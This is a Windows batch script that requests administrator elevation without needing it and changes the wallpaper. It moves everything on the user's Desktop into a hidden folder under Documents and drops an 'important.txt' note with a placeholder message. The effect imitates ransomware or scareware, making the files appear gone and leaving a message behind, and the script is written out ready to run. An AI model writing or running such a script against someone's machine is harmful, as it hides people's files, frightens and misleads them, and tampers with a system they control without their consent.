@echo off
:: Check if script is running as Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit
)

:: Set the wallpaper (change the path to your image)
set wallpaper="C:\path\to\your\image.jpg"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %wallpaper% /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Define paths
set desktop=%USERPROFILE%\Desktop
set documents=%USERPROFILE%\Documents
set new_folder=%documents%\abcdefg

:: Create the folder if it doesn't exist
if not exist "%new_folder%" mkdir "%new_folder%"

:: Move all files and folders from Desktop to "abcdefg"
move "%desktop%\*" "%new_folder%\"

:: Hide the folder
attrib +h "%new_folder%"

:: Create the warning text file
echo YOUR_CUSTOM_MESSAGE_HERE > "%desktop%\important.txt"

echo Script executed successfully.
exit
